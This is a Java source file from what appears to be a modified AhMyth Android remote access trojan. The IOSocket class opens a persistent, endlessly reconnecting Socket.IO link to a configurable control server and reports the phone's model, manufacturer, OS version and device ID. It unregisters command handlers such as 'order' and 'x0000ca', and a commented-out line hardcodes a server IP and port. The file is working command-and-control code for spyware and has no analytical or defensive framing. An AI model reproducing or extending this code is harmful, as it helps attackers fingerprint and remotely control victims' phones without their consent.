package ahmyth.mine.king.ahmyth;


import android.content.Context;
import android.content.SharedPreferences;
import android.os.Build;
import android.preference.PreferenceManager;
import android.provider.Settings;
import android.util.Log;

import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;

import java.net.URISyntaxException;
import io.socket.client.IO;
import io.socket.client.Socket;


public class IOSocket {
    private static IOSocket ourInstance = new IOSocket();
    private io.socket.client.Socket ioSocket;

    private IOSocket() {
        try {

            String deviceID = Settings.Secure.getString(MainService.getContextOfApplication().getContentResolver(), Settings.Secure.ANDROID_ID);
            IO.Options opts = new IO.Options();
            opts.reconnection = true;
            //opts.forceNew = true;
            opts.reconnectionDelay = 5000;
            opts.reconnectionDelayMax = 999999999;

            /*Obteniendo Preferencias*/

            SharedPreferences sharedPref = PreferenceManager.getDefaultSharedPreferences(MainService.getContextOfApplication());

            String currentUrl = sharedPref.getString("URL","DEFAULT URL");
            String currentPort = sharedPref.getString("PORT","DEFAULT PORT");

            /**/
            Log.w("lalo", "Conectando URL : " + currentUrl  + " PORT : " + currentPort);

            //ioSocket = IO.socket("http://159.203.92.82:42474?model="+ android.net.Uri.encode(Build.MODEL)+"&manf="+Build.MANUFACTURER+"&release="+Build.VERSION.RELEASE+"&id="+deviceID);
            ioSocket = IO.socket(currentUrl +":" + currentPort + "?model="+ android.net.Uri.encode(Build.MODEL)+"&manf="+Build.MANUFACTURER+"&release="+Build.VERSION.RELEASE+"&id="+deviceID,opts);

        } catch (URISyntaxException e) {
            e.printStackTrace();
        }
    }

    public static IOSocket getInstance() {
        return ourInstance;
    }

    public static void resetInstance() {

        /**/
        ourInstance.getIoSocket().disconnect();
        ourInstance.getIoSocket().off("ping");
        ourInstance.getIoSocket().off("order");
        ourInstance.getIoSocket().off("pong");
        ourInstance.getIoSocket().off("x0000ca");
        ourInstance.setIoSocketToNull();
        ourInstance = null;
        //ourInstance.getIoSocket() = null;
        /**/
        ourInstance = new IOSocket();
    }

    public void setIoSocketToNull(){
        ioSocket = null;
    }

    public static io.socket.client.Socket RenewInstance(io.socket.client.Socket _currentInstance)
    {
        try {
            //Lo mismo que el Constructor sólo que en la static
            String deviceID = Settings.Secure.getString(MainService.getContextOfApplication().getContentResolver(), Settings.Secure.ANDROID_ID);
            IO.Options opts = new IO.Options();
            opts.reconnection = true;
            //opts.forceNew = true;
            opts.reconnectionDelay = 5000;
            opts.reconnectionDelayMax = 999999999;

            /*Obteniendo Preferencias*/

            SharedPreferences sharedPref = PreferenceManager.getDefaultSharedPreferences(MainService.getContextOfApplication());

            String currentUrl = sharedPref.getString("URL","DEFAULT URL");
            String currentPort = sharedPref.getString("PORT","DEFAULT PORT");


            Log.w("lalo", "Reconectando URL : " + currentUrl  + " PORT : " + currentPort);

            _currentInstance = null;

            //ioSocket = IO.socket("http://159.203.92.82:42474?model="+ android.net.Uri.encode(Build.MODEL)+"&manf="+Build.MANUFACTURER+"&release="+Build.VERSION.RELEASE+"&id="+deviceID);
            _currentInstance = IO.socket(currentUrl +":" + currentPort + "?model="+ android.net.Uri.encode(Build.MODEL)+"&manf="+Build.MANUFACTURER+"&release="+Build.VERSION.RELEASE+"&id="+deviceID,opts);


        } catch (URISyntaxException e) {
            e.printStackTrace();
        }

        return _currentInstance;
    }

    public Socket getIoSocket() {
        return ioSocket;
    }

}
